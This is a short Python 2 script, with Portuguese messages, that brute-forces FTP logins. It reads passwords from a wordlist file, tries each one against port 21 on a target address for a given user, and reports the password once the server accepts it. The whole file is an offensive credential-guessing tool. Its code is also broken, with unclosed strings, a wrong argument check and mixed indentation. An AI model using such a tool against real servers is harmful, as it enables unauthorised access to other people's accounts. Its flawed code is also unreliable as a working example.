#!/usr/bin/python
import socket
import re
import sys

if len(sys.argv) < 2  :
         print "Use python jeanftp.py 127.0.0.1 usuario"
	sys.exit(0)

usuario =  sys.argv[2]

file =  open("lista.txt")  
for linha in file.readlines() : 

	print "teste com  %s: %s: " %(usuario,linha)
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((sys.argv[1],21))
	s.recv(1024)
	s.send("USER "+usuario+"\r\n")
	s.recv(1024)

	s.send("PASS "+linha+"\r\n)
	resultado = s.recv(1024)
	s.send("QUIT\r\n")

	if re.search("230",resultado):
		print "[+] ===>>> SENHA ENCONTRADA <<<=== %(linha)
		break

	else:
		print "[-] Acesso Negado [-]\n"
